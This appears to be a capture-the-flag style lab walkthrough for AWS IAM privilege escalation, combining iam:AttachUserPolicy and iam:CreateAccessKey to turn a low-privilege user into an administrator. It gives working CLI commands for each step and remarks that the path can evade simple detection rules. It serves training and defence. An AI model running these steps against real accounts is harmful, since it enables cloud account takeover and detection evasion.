# Guided Walkthrough: Privilege Escalation via iam:AttachUserPolicy + iam:CreateAccessKey

This scenario demonstrates a privilege escalation vulnerability that combines two powerful IAM permissions: `iam:AttachUserPolicy` and `iam:CreateAccessKey`. When a user has both of these permissions on another IAM user, they can perform lateral movement to gain administrative privileges through that target user.

The attack works by first attaching the AWS-managed `AdministratorAccess` policy to the target user using `iam:AttachUserPolicy`, then creating new access keys for that user with `iam:CreateAccessKey`. The attacker can then authenticate using these new credentials to gain full administrative access to the AWS account.

This is a classic example of a lateral movement privilege escalation path where the attacker doesn't directly escalate their own permissions, but instead leverages their ability to modify and impersonate another user. This scenario differs from the `iam-putuserpolicy+iam-createaccesskey` variant by using AWS-managed policies instead of inline policies, which are often overlooked in security reviews because managed policies are generally considered "safer."

## The Challenge

You start as `pl-prod-iam-015-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. Your goal is to reach full administrative access to the AWS account.

Your starting user has been granted two specific permissions, both scoped to a single target user:
- `iam:AttachUserPolicy` on `arn:aws:iam::*:user/pl-prod-iam-015-to-admin-target-user`
- `iam:CreateAccessKey` on `arn:aws:iam::*:user/pl-prod-iam-015-to-admin-target-user`

The target user — `pl-prod-iam-015-to-admin-target-user` — currently has no elevated permissions. Your job is to change that.

## Reconnaissance

First, let's confirm who we are and what we're working with:

```bash
aws sts get-caller-identity --query 'Arn' --output text
```

You should see the starting user ARN. Next, verify that the starting user can't do anything privileged yet — trying to list IAM users should fail:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

Now look at the target user to understand its current state:

```bash
aws iam get-user --user-name pl-prod-iam-015-to-admin-target-user \
  --query 'User.[UserName,Arn]' --output table

aws iam list-attached-user-policies --user-name pl-prod-iam-015-to-admin-target-user \
  --query 'AttachedPolicies[*].PolicyName' --output text
# Expected: (none)
```

The target user exists but has no attached managed policies. That's about to change.

## Exploitation

### Step 1: Attach AdministratorAccess to the target user

Using the starting user's `iam:AttachUserPolicy` permission, attach the AWS-managed `AdministratorAccess` policy to the target user:

```bash
aws iam attach-user-policy \
  --user-name pl-prod-iam-015-to-admin-target-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

This is the privilege escalation vector. The starting user isn't granting itself admin access — it's granting admin access to a different user. This kind of cross-user policy manipulation is exactly what `iam:AttachUserPolicy` enables.

Wait 15 seconds for IAM policy changes to propagate before continuing.

### Step 2: Create access keys for the target user

Now use `iam:CreateAccessKey` to generate a new credential set for the target user:

```bash
aws iam create-access-key --user-name pl-prod-iam-015-to-admin-target-user --output json
```

Capture the `AccessKeyId` and `SecretAccessKey` from the response. These are the keys you'll use to authenticate as the now-privileged target user.

Wait another 15 seconds for the new keys to initialize.

### Step 3: Authenticate as the target user

Configure your environment with the newly created credentials:

```bash
export AWS_ACCESS_KEY_ID=<new_access_key_id>
export AWS_SECRET_ACCESS_KEY=<new_secret_access_key>
unset AWS_SESSION_TOKEN
```

## Verification

Verify that you now have administrative access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# Should show: pl-prod-iam-015-to-admin-target-user

aws iam list-users --max-items 3 --output table
# Should succeed — admin access confirmed
```

If `iam:ListUsers` returns results, you have successfully escalated to full administrative privileges.

## What Happened

You started with two targeted permissions on a low-privilege user and turned them into full administrative access to the AWS account. The key insight is that `iam:AttachUserPolicy` doesn't just let you change your own permissions — it lets you change any user's permissions within the resource scope of the policy. When combined with `iam:CreateAccessKey`, an attacker can grant another user elevated permissions and then create credentials to impersonate that user.

This pattern is particularly tricky because it involves two separate API calls and two separate principals. Many detection rules look for a single principal granting itself elevated permissions. This lateral movement approach — modify user A, then create keys for user A — can slip through simpler alerting logic. The use of AWS-managed policies (rather than custom inline policies) can add to the stealth, since some security reviews treat managed policy attachments as less risky than inline policy modifications.
